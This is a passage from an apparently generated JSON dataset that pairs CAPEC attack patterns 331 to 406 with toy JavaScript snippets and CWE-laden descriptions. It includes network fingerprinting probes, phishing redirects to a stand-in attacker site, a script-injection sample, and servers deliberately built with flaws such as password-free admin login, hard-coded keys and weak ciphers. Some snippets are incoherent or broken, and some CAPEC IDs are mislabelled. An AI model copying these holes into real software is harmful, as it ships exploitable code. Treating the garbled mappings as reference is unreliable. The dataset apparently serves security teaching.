        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('');\nconst targetPort = 12345; // Closed port\nconst targetHost = '192.168.1.1';\n\nclient.send(message, targetPort, targetHost, (err) => {\n  if (err) {\n    console.error('Error sending message:', err);\n    client.close();\n    return;\n  }\n  console.log('Message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received message from ${rinfo.address}:${rinfo.port}`);\n  console.log('IP Header Total Length Field:', msg.readUInt16BE(2));\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates the concept of the 'ICMP IP Total Length Field Probe' attack. It uses the 'dgram' module to create a UDP client that sends an empty UDP packet to a closed port on a target machine. When the target machine responds with a 'Port Unreachable' ICMP error message, the client captures this response and extracts the IP Header's total length field value from the echoed message. This behavior can be used to build a signature base of operating system responses. The code also highlights potential vulnerabilities such as 'Observable Response Discrepancy' (CWE-204) by revealing internal state information through different responses, and 'Improper Handling of Length Parameter Inconsistency' (CWE-130) by not properly handling the length field in the response."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Hello');\nconst targetPort = 12345;\nconst targetHost = '192.168.1.1';\n\nclient.send(message, 0, message.length, targetPort, targetHost, (err) => {\n  if (err) throw err;\n  console.log('UDP message sent');\n});\n\nclient.on('message', (msg, rinfo) => {\n  console.log(`Received ICMP error message from ${rinfo.address}:${rinfo.port}`);\n  console.log(`Message: ${msg.toString('hex')}`);\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates the concept of the CAPEC 'ICMP IP 'ID' Field Error Message Probe'. It sends a UDP datagram to a closed port on a target host and listens for an ICMP error message in response. The code uses the 'dgram' module to create a UDP socket, send a message, and handle incoming messages. The received ICMP error message can reveal internal state information about the target system, embodying CWE-204 (Observable Response Discrepancy) and CWE-211 (Externally-Generated Error Message Containing Sensitive Information). This approach can be used to fingerprint specific OS behaviors based on how the ICMP error message is constructed."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  if (req.url === '/event' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Log user data in cleartext (CWE-319)\n      console.log('User data:', body);\n      res.end('Event registered');\n    });\n  } else {\n    res.statusCode = 404;\n    res.end();\n  }\n});\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server that listens for POST requests to the '/event' endpoint. When a request is received, it logs the user data in cleartext to the console, embodying CWE-319 (Cleartext Transmission of Sensitive Information). This represents the CAPEC scenario where an adversary hosts an event and monitors the data exchanged during the event. The lack of encryption and proper protection of the communication channel (CWE-311, CWE-419) makes it easy for an attacker to harvest sensitive information such as user IDs and usernames. This code demonstrates how sensitive information can be exposed and logged without proper security measures, making it vulnerable to harvesting attacks."
    },
    {
        "capec_id": "384",
        "capec_name": "Application API Message Manipulation via Man-in-the-Middle",
        "code_snippet": "const sensitiveData = 'userPassword123';\n\n// Simulate sending data to the server\nfunction sendData(data) {\n  // Client-side encryption (CWE-311)\n  const encryptedData = btoa(data); // Base64 encoding (not secure)\n  // Send the encrypted data to the server\n  fetch('https://example.com/api', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({ data: encryptedData })\n  })\n  .then(response => response.json())\n  .then(data => console.log('Success:', data))\n  .catch((error) => console.error('Error:', error));\n}\n\n// Simulate an attacker intercepting and modifying the data (CAPEC-94)\nfunction interceptAndModifyData(data) {\n  // Modify the assumed-immutable data (CWE-471)\n  let modifiedData = data.replace('userPassword123', 'attackerPassword456');\n  // Send the modified data to the server\n  sendData(modifiedData);\n}\n\n// Original data sent by the client\nsendData(sensitiveData);\n\n// Attacker intercepts and modifies the data\ninterceptAndModifyData(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is sent from a client to a server. The data is 'encrypted' using Base64 encoding, which is not secure (CWE-311). The function `sendData` simulates sending this data to a server. An attacker can intercept and modify this data (CAPEC-94) using the `interceptAndModifyData` function, which changes the assumed-immutable data (CWE-471) before sending it to the server. This represents a man-in-the-middle attack at the application layer, exploiting the server's trust in the integrity of the client-supplied data."
    },
    {
        "capec_id": "385",
        "capec_name": "Transaction or Event Tampering via Application API Manipulation",
        "code_snippet": "const http = require('http');\nconst net = require('net');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    // Simulate tampering with the transaction data\n    if (body.includes('transaction')) {\n      body = body.replace('amount=100', 'amount=1000'); // CWE-471: Modification of Assumed-Immutable Data\n    }\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end(body);\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// Man-in-the-middle attack simulation\nconst client = net.createConnection({ port: 8080 }, () => {\n  client.write('POST / HTTP/1.1\\r\\n');\n  client.write('Host: localhost\\r\\n');\n  client.write('Content-Length: 20\\r\\n');\n  client.write('\\r\\n');\n  client.write('transaction=amount=100');\n});\n\nclient.on('data', (data) => {\n  console.log('Tampered data received:', data.toString());\n  client.end();\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a transaction tampering attack via application API manipulation. The HTTP server listens for incoming requests and simulates tampering with transaction data by modifying the amount from 100 to 1000. This represents CWE-471 (Modification of Assumed-Immutable Data). The client part of the code simulates a man-in-the-middle attack by sending a transaction request to the server and receiving the tampered response. This example highlights the vulnerabilities described in the CAPEC, such as insufficient verification of data authenticity (CWE-345), origin validation errors (CWE-346), and the risks of client-side enforcement of server-side security (CWE-602)."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "const userGallery = document.getElementById('userGallery');\nconst maliciousImage = document.createElement('img');\nmaliciousImage.src = 'https://attacker-site.com/malicious.jpg';\nmaliciousImage.onclick = function() {\n  window.location.href = 'https://attacker-site.com/phishing';\n};\nuserGallery.appendChild(maliciousImage);",
        "description": "This JavaScript code snippet demonstrates an 'Application API Navigation Remapping' attack. The attacker injects a malicious image into a user's photo gallery. When the user clicks on the image, they are redirected to a phishing site controlled by the attacker. This attack leverages CWE-471 (Modification of Assumed-Immutable Data) by altering the content of the user's gallery, CWE-345 (Insufficient Verification of Data Authenticity) and CWE-346 (Origin Validation Error) by not verifying the authenticity of the image source, and CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side code to enforce security. The code does not encrypt sensitive data (CWE-311), making it easier for the attacker to manipulate the content."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "const serverUrl = 'https://trustedserver.com/api/data';\n\nfunction fetchData() {\n  fetch(serverUrl)\n    .then(response => response.json())\n    .then(data => {\n      // Assume data is immutable and trusted\n      processData(data);\n    })\n    .catch(error => console.error('Error fetching data:', error));\n}\n\nfunction processData(data) {\n  // Client-side enforcement of server-side security\n  if (data.isValid) {\n    displayData(data);\n  } else {\n    console.error('Invalid data received');\n  }\n}\n\nfunction displayData(data) {\n  document.getElementById('content').innerHTML = data.content;\n}\n\n// Simulate an attacker modifying the data\nfetchData = function() {\n  const maliciousData = { isValid: true, content: '<script>alert(\"Hacked!\")</script>' };\n  processData(maliciousData);\n};\n\n// Fetch data (this will use the malicious fetchData function)\nfetchData();",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker manipulates the client-side code to propagate malicious content. The original `fetchData` function fetches data from a trusted server and processes it, assuming the data is immutable and trusted (CWE-471). The `processData` function relies on client-side checks to enforce server-side security (CWE-602), and does not sufficiently verify the authenticity of the data (CWE-345, CWE-346). The attacker modifies the `fetchData` function to inject malicious content, which is then processed and displayed without proper validation, illustrating the vulnerability described in the CAPEC."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "const apiResponse = {\n  button: {\n    label: 'Click Me',\n    url: 'https://trusted-site.com'\n  }\n};\n\n// Vulnerable: Client-side modification of assumed-immutable data\napiResponse.button.url = 'https://attacker-site.com';\n\n// Function to render button (simulated)\nfunction renderButton(button) {\n  const buttonElement = document.createElement('button');\n  buttonElement.innerText = button.label;\n  buttonElement.onclick = () => window.location.href = button.url;\n  document.body.appendChild(buttonElement);\n}\n\n// Render the manipulated button\nrenderButton(apiResponse.button);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can manipulate the URL of a button in an API response. The original URL ('https://trusted-site.com') is changed to an attacker's URL ('https://attacker-site.com'). This represents the CAPEC 'Application API Button Hijacking' by showing how an attacker can modify assumed-immutable data (CWE-471) on the client side. The code also highlights the lack of data authenticity verification (CWE-345) and origin validation (CWE-346), as well as the reliance on client-side enforcement of security (CWE-602). The button is then rendered with the manipulated URL, potentially leading users to a malicious site."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/api/data',\n  method: 'GET'\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    // Manipulate the response data\n    data = data.replace(/originalContent/g, 'spoofedContent');\n    console.log('Modified Response:', data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic example of content spoofing via application API manipulation. The code makes an HTTP GET request to an API endpoint and intercepts the response data. It then manipulates the response content by replacing 'originalContent' with 'spoofedContent'. This represents the CAPEC-94 attack where an attacker manipulates the data between the client and server to produce deceptive content. The code also highlights CWE-353 (Missing Support for Integrity Check) as it does not verify the integrity of the data, CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side manipulation, and CWE-603 (Use of Client-Side Authentication) by not performing any server-side authentication checks."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "const accessControl = (user) => {\n  if (user.hasPhysicalAccess) {\n    console.log('Access granted to sensitive information.');\n    // No additional checks for physical side channels or voltage glitches\n  } else {\n    console.log('Access denied.');\n  }\n};\n\nconst user = { hasPhysicalAccess: true };\naccessControl(user);",
        "description": "This JavaScript code snippet represents a simplified access control mechanism that grants access to sensitive information based solely on physical access. The function `accessControl` checks if the user has physical access and grants access without additional security checks. This embodies the main idea of CAPEC-170 (Bypassing Physical Security) by highlighting the vulnerability of relying solely on physical access control. The code does not account for potential side-channel attacks (CWE-1300), improper physical access control (CWE-1263), voltage and clock glitches (CWE-1247), electromagnetic fault injection (CWE-1319), or improper handling of error messages and alerts (CWE-1320). This lack of comprehensive security measures makes the system susceptible to deliberate and carefully planned physical security breaches."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "class PhysicalLock {\n  constructor() {\n    this.locked = true;\n    this.debugMode = false;\n  }\n\n  unlock() {\n    if (this.debugMode) {\n      console.log('Debug mode active: Lock bypassed');\n      this.locked = false;\n    } else {\n      console.log('Attempting to unlock...');\n      // Simulate lock picking or bumping\n      this.locked = Math.random() > 0.5 ? false : true;\n      if (!this.locked) {\n        console.log('Lock successfully bypassed');\n      } else {\n        console.log('Failed to bypass lock');\n      }\n    }\n  }\n\n  setDebugMode(mode) {\n    this.debugMode = mode;\n  }\n}\n\n// Example usage\nconst lock = new PhysicalLock();\nlock.setDebugMode(true); // Enable debug mode to bypass lock\nlock.unlock(); // Attempt to unlock",
        "description": "This JavaScript code snippet represents a simplified model of bypassing physical locks, as described in the CAPEC. The `PhysicalLock` class simulates a physical lock with a `locked` state and a `debugMode` that, when enabled, allows the lock to be bypassed without any resistance. The `unlock` method attempts to unlock the lock, either by simulating lock picking or bumping (with a 50% success rate) or by bypassing the lock entirely if `debugMode` is active. This demonstrates vulnerabilities such as 'Improper Physical Access Control' (CWE-1263) and 'Hardware Internal or Debug Modes Allow Override of Locks' (CWE-1234)."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "const lock = { isLocked: true, lockBit: 1, addressRegion: '0x00-0xFF' }; \n\nfunction bumpKeyAttack() { \n  if (lock.isLocked) { \n    // Simulate bump key attack by modifying the lock bit \n    lock.lockBit = 0; \n    lock.isLocked = false; \n    console.log('Lock opened!'); \n  } else { \n    console.log('Lock is already open.'); \n  } \n} \n\nfunction powerStateTransition() { \n  // Simulate power state transition that resets lock bit \n  lock.lockBit = 1; \n  lock.isLocked = true; \n  console.log('Power state transition: Lock reset.'); \n} \n\n// Simulate the attack \nbumpKeyAttack(); \n// Simulate power state transition \npowerStateTransition(); \n// Attempt the attack again \nbumpKeyAttack();",
        "description": "This JavaScript code snippet simulates a lock bumping attack and the vulnerabilities associated with improper lock bit management and power state transitions. The 'lock' object represents a lock with a 'lockBit' and 'isLocked' status. The 'bumpKeyAttack' function simulates an attack by modifying the 'lockBit' to unlock the lock. The 'powerStateTransition' function simulates a power state transition that resets the lock bit, making the lock vulnerable again. This demonstrates how an attacker can exploit improper lock bit management and power state transitions to gain unauthorized access."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "class Lock {\n  constructor() {\n    this.locked = false;\n  }\n\n  lock() {\n    if (!this.locked) {\n      this.locked = true;\n      console.log('Lock engaged.');\n    } else {\n      console.log('Lock is already engaged.');\n    }\n  }\n\n  unlock() {\n    if (this.locked) {\n      this.locked = false;\n      console.log('Lock disengaged.');\n    } else {\n      console.log('Lock is already disengaged.');\n    }\n  }\n\n  isLocked() {\n    return this.locked;\n  }\n}\n\n// Simulating lock picking\nconst lock = new Lock();\nlock.lock();\n\n// Bypassing the lock without proper authorization\nlock.locked = false; // CWE-1231: Improper Prevention of Lock Bit Modification\n\nif (!lock.isLocked()) {\n  console.log('Lock has been picked!');\n} else {\n  console.log('Lock is still engaged.');\n}",
        "description": "This JavaScript code snippet defines a simple Lock class with methods to lock and unlock a resource. The lock() method sets a 'locked' flag to true, and the unlock() method sets it to false. The isLocked() method checks the status of the lock. The code then simulates a lock picking attack by directly modifying the 'locked' property of the Lock instance, bypassing the intended lock mechanism (CWE-1231: Improper Prevention of Lock Bit Modification). This demonstrates how an attacker might manipulate the internal state of a lock to gain unauthorized access, embodying the main idea of the CAPEC 'Lock Picking'."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "class Lock {\n  constructor() {\n    this.locked = true;\n    this.lockBit = 1; // Represents a lock bit\n  }\n\n  unlock() {\n    if (this.lockBit === 1) {\n      console.log('Lock is protected by lock bit.');\n      return;\n    }\n    this.locked = false;\n    console.log('Lock is now unlocked.');\n  }\n\n  forceUnlock() {\n    // Simulate a snap gun attack by directly modifying the lock state\n    this.locked = false;\n    console.log('Lock has been forced open, potential damage detected.');\n  }\n\n  modifyLockBit(newBit) {\n    // CWE-1231: Improper Prevention of Lock Bit Modification\n    this.lockBit = newBit;\n    console.log('Lock bit has been modified.');\n  }\n}\n\nconst myLock = new Lock();\nmyLock.unlock(); // Attempt to unlock normally\nmyLock.modifyLockBit(0); // Improperly modify the lock bit\nmyLock.unlock(); // Now unlock should work\nmyLock.forceUnlock(); // Simulate a snap gun attack",
        "description": "This JavaScript code snippet represents a simplified model of a lock mechanism, embodying the main idea of CAPEC-Using a Snap Gun Lock to Force a Lock. The 'Lock' class has methods to unlock the lock, forcefully unlock it (simulating a snap gun attack), and modify the lock bit. The 'forceUnlock' method directly changes the lock state, representing the physical forcing of a lock using a snap gun, which may leave evidence of tampering. The 'modifyLockBit' method demonstrates CWE-1231 (Improper Prevention of Lock Bit Modification) by allowing the lock bit to be changed, which should not be permissible in a secure system. This code highlights vulnerabilities in lock mechanisms and the potential for forced entry or tampering."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Function to encrypt data using a broken algorithm (CWE-327)\nfunction encryptData(data) {\n  const cipher = crypto.createCipheriv('des-ecb', Buffer.from(hardCodedKey), null);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Simulate access control check\nfunction accessControl(cardData) {\n  const encryptedCardData = encryptData(cardData);\n  // Simulate a check against a stored encrypted card data\n  const storedEncryptedData = '5d41402abc4b2a76b9719d911017c592'; // Example stored hash\n  if (encryptedCardData === storedEncryptedData) {\n    console.log('Access Granted');\n  } else {\n    console.log('Access Denied');\n  }\n}\n\n// Example usage\nconst cardData = 'exampleCardData';\naccessControl(cardData);",
        "description": "This JavaScript code snippet demonstrates a simplified electronic access control system that uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (DES in ECB mode, CWE-327) to encrypt card data. The `encryptData` function encrypts the card data using DES encryption with a hard-coded key. The `accessControl` function simulates an access control check by comparing the encrypted card data with a stored encrypted value. This code embodies the main idea of CAPEC-115, 'Bypassing Electronic Locks and Access Controls,' by illustrating how weak cryptographic practices can be exploited to bypass security mechanisms. An attacker could reverse-engineer the encryption process or use the hard-coded key to generate valid encrypted card data, thereby gaining unauthorized access."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate storing a magnetic strip card number\nlet cardNumber = '1234567890123456';\n\n// Use a weak cryptographic algorithm (MD5) to hash the card number\nlet hash = crypto.createHash('md5').update(cardNumber).digest('hex');\n\n// Simulate an authentication check using the hashed card number\nfunction authenticate(inputHash) {\n  if (inputHash === hash) {\n    console.log('Authentication successful');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Simulate an attacker capturing and replaying the hash\nlet capturedHash = hash;\nauthenticate(capturedHash);",
        "description": "This JavaScript code snippet demonstrates a vulnerable authentication mechanism that uses a weak cryptographic algorithm (MD5) to hash a magnetic strip card number. The `authenticate` function checks if the input hash matches the stored hash. An attacker can capture the hash and replay it to bypass authentication, illustrating CWE-294 (Authentication Bypass by Capture-replay) and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm). This example embodies the main idea of the deprecated CAPEC related to bypassing card-based systems by exploiting weak cryptographic practices and replay attacks."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "const magstripeData = '1234567890123456'; // Example magstripe data\n\nclass MagstripeCard {\n  constructor(data) {\n    this.data = data;\n  }\n\n  clone() {\n    return new MagstripeCard(this.data);\n  }\n}\n\n// Simulate reading a magstripe card\nconst originalCard = new MagstripeCard(magstripeData);\nconsole.log('Original Card Data:', originalCard.data);\n\n// Clone the card to create a duplicate\nconst clonedCard = originalCard.clone();\nconsole.log('Cloned Card Data:', clonedCard.data);\n\n// Simulate using the cloned card for unauthorized access\nfunction useCard(card) {\n  if (card.data === magstripeData) {\n    console.log('Access Granted');\n  } else {\n    console.log('Access Denied');\n  }\n}\n\nuseCard(clonedCard);",
        "description": "This JavaScript code snippet demonstrates the concept of cloning magnetic strip cards to gain unauthorized access, as described in the CAPEC. The `MagstripeCard` class represents a magnetic strip card with sensitive data. The `clone` method allows for duplicating the card, embodying CWE-498 (Cloneable Class Containing Sensitive Information). The `useCard` function simulates using the cloned card to gain access, highlighting the vulnerability of magstripe technology to unauthorized duplication. The code illustrates how easily an attacker can clone a magstripe card and use the duplicate to gain unauthorized access."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Simulate magnetic strip card data\nconst cardData1 = '1234-5678-9012-3456';\nconst cardData2 = '2345-6789-0123-4567';\n\n// Use a broken cryptographic algorithm (CWE-327)\nfunction encryptCardData(data) {\n  const cipher = crypto.createCipher('des', hardCodedKey);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Simulate brute force attack by generating new card data (CWE-307)\nfunction bruteForceCardData() {\n  const possibleNumbers = '0123456789';\n  let newCardData = '';\n  for (let i = 0; i < 16; i++) {\n    newCardData += possibleNumbers.charAt(Math.floor(Math.random() * possibleNumbers.length));\n  }\n  return newCardData;\n}\n\n// Encrypt new card data\nconst newCardData = bruteForceCardData();\nconst encryptedNewCardData = encryptCardData(newCardData);\n\nconsole.log('New Card Data:', newCardData);\nconsole.log('Encrypted New Card Data:', encryptedNewCardData);",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can generate new magnetic strip card data by brute-forcing (CWE-307) and then encrypting it using a broken cryptographic algorithm (CWE-327) with a hard-coded key (CWE-321). The code simulates the generation of new card data by randomly creating a 16-digit number and then encrypting it using the DES algorithm with a hard-coded key. This represents the main idea of the CAPEC, where an adversary can analyze and generate valid sequences to create new cards for unauthorized access or impersonation."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "const rfidReader = require('rfid-reader');\nconst clonedRFID = {};\n\nrfidReader.on('data', (data) => {\n  const identifier = data.id;\n  if (clonedRFID[identifier]) {\n    console.log('Duplicate RFID detected:', identifier);\n  } else {\n    clonedRFID[identifier] = data;\n    console.log('RFID cloned:', identifier);\n  }\n});\n\n// Simulate an insecure security identifier mechanism\nfunction insecureSecurityIdentifier(data) {\n  // Incorrectly decode security identifier\n  const decodedId = decodeSecurityIdentifier(data.id);\n  if (decodedId === 'trusted') {\n    console.log('Access granted to:', data.id);\n  } else {\n    console.log('Access denied to:', data.id);\n  }\n}\n\nfunction decodeSecurityIdentifier(id) {\n  // Simulate incorrect decoding\n  return id === '12345' ? 'trusted' : 'untrusted';\n}\n\n// Simulate reading RFID data\nrfidReader.emit('data', { id: '12345', info: 'Employee Access' });\nrfidReader.emit('data', { id: '12345', info: 'Employee Access' });\nrfidReader.emit('data', { id: '67890', info: 'Visitor Access' });\n\n// Simulate insecure security identifier check\ninsecureSecurityIdentifier({ id: '12345' });\ninsecureSecurityIdentifier({ id: '67890' });",
        "description": "This JavaScript code snippet simulates the cloning of RFID cards and the associated vulnerabilities. The `rfidReader` object listens for RFID data and checks if the RFID identifier has already been cloned. If a duplicate identifier is detected, it logs a message indicating the duplication. The `insecureSecurityIdentifier` function simulates an insecure security identifier mechanism by incorrectly decoding the security identifier, potentially granting unauthorized access. This code embodies the main idea of CAPEC-170 (Cloning RFID Cards or Chips) and demonstrates related CWEs such as CWE-1294 (Insecure Security Identifier Mechanism) and CWE-1290 (Incorrect Decoding of Security Identifiers)."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "class RFIDChip {\n  constructor() {\n    this.active = true;\n    this.debugMode = false;\n    this.sensitiveData = 'Sensitive Information';\n  }\n\n  deactivateChip() {\n    if (this.debugMode) {\n      this.active = false;\n      console.log('RFID Chip deactivated.');\n    } else {\n      console.log('Access denied: Debug mode not enabled.');\n    }\n  }\n\n  enableDebugMode() {\n    this.debugMode = true;\n    console.log('Debug mode enabled.');\n  }\n\n  scrubSensitiveData() {\n    if (!this.active) {\n      this.sensitiveData = null;\n      console.log('Sensitive data scrubbed.');\n    } else {\n      console.log('Cannot scrub data while chip is active.');\n    }\n  }\n}\n\n// Example usage\nconst rfid = new RFIDChip();\nrfid.enableDebugMode(); // CWE-1191: Improper access control to debug mode\nrfid.deactivateChip(); // CAPEC: Deactivating the RFID chip\nrfid.scrubSensitiveData(); // CWE-1266: Improper scrubbing of sensitive data",
        "description": "This JavaScript code snippet represents an RFID chip class with methods to deactivate the chip, enable debug mode, and scrub sensitive data. The `enableDebugMode` method simulates CWE-1191 by allowing unauthorized access to debug mode, which is a prerequisite for deactivating the chip. The `deactivateChip` method embodies the main idea of the CAPEC by deactivating the RFID chip when debug mode is enabled. The `scrubSensitiveData` method addresses CWE-1266 by attempting to scrub sensitive data only when the chip is deactivated. This code demonstrates how improper access control and handling of sensitive data can lead to vulnerabilities in RFID systems."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "const fs = require('fs');\nconst hardwareComponent = '/dev/hardwareComponent';\n\n// Improper Physical Access Control\nif (fs.existsSync(hardwareComponent)) {\n  // Improper Restriction of Software Interfaces to Hardware Features\n  fs.writeFileSync(hardwareComponent, 'malicious data');\n\n  // Hardware Allows Activation of Test or Debug Logic at Runtime\n  const debugMode = true;\n  if (debugMode) {\n    console.log('Debug mode activated. Hardware state can be altered.');\n  }\n\n  // Improper Protection Against Voltage and Clock Glitches\n  const voltage = 5; // Assume this is a critical voltage level\n  if (voltage > 3.3) {\n    console.log('Voltage glitch detected. Sensitive information may be exposed.');\n  }\n\n  // Improper Protection of Physical Side Channels\n  const powerConsumption = 100; // Assume this is a critical power consumption level\n  if (powerConsumption > 90) {\n    console.log('Potential side channel attack detected via power consumption.');\n  }\n}",
        "description": "This JavaScript code snippet simulates a scenario where an adversary exploits various hardware vulnerabilities. It checks for the existence of a hardware component and writes malicious data to it, representing improper physical access control and restriction of software interfaces to hardware features. It then simulates the activation of debug logic at runtime, which can alter the hardware state. The code also includes checks for voltage glitches and power consumption patterns, representing improper protection against voltage and clock glitches and physical side channels, respectively. This snippet embodies the main idea of the CAPEC by demonstrating how an adversary could exploit these weaknesses to compromise hardware integrity."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "const hardCodedPassword = 'defaultPassword';\n\nfunction authenticate(password) {\n  if (password === hardCodedPassword) {\n    return true;\n  }\n  return false;\n}\n\nfunction updatePassword(newPassword) {\n  // Assume user is authenticated via BIOS\n  hardCodedPassword = newPassword;\n  console.log('Password updated successfully');\n}\n\n// Simulate bypassing ATA security by directly calling updatePassword without authentication\nupdatePassword('newSecurePassword');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to bypassing ATA password security. The `authenticate` function checks if the provided password matches a hard-coded password, which is a security flaw (CWE-259). The `updatePassword` function allows updating the password without proper authentication, assuming the user has already authenticated via BIOS (CWE-285). This represents the main idea of the CAPEC, where an adversary can exploit the weakness by directly calling the `updatePassword` function to change the password without proper authorization. The code highlights the improper authorization and use of hard-coded credentials, making it vulnerable to attacks."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const logData = `${new Date().toISOString()} - ${req.method} ${req.url} - ${req.headers['user-agent']}\n`;\n  fs.appendFile('server.log', logData, (err) => {\n    if (err) throw err;\n  });\n\n  if (req.url === '/admin' && req.headers['x-auth-token'] !== 'securetoken') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin page');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that logs incoming requests to a file named 'server.log'. The log includes the timestamp, request method, URL, and user-agent header. The server also has a simple authentication check for accessing the '/admin' page, where it checks for a specific 'x-auth-token' header. If the token is incorrect, it responds with a 403 Forbidden status. This code embodies the deprecated CAPEC related to social information gathering attacks by demonstrating how sensitive information (like user-agent and access attempts) can be logged and potentially exposed. It also touches on the related CWEs by showing potential issues with logging sensitive information (CWE-532) and a simplistic authentication mechanism that could be bypassed (CWE-287)."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const { username, password } = JSON.parse(body);\n      // Authentication Bypass Issue (CWE-287)\n      if (username === 'admin') {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end('Welcome admin!');\n      } else {\n        res.writeHead(401, {'Content-Type': 'text/plain'});\n        res.end('Unauthorized');\n      }\n      // Information Exposure Through Server Log Files (CWE-532)\n      fs.appendFile('server.log', `Login attempt: ${username}\\n`, err => {\n        if (err) throw err;\n      });\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that handles login requests. It demonstrates several deprecated weaknesses related to the CAPEC description. The server listens for POST requests to the '/login' endpoint and processes the login data. It contains an authentication bypass issue (CWE-287) by allowing any user with the username 'admin' to log in without verifying the password. Additionally, it logs login attempts to a server log file, potentially exposing sensitive information (CWE-532). This code embodies the main idea of the deprecated CAPEC by illustrating how improper handling of authentication and logging can lead to security vulnerabilities."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
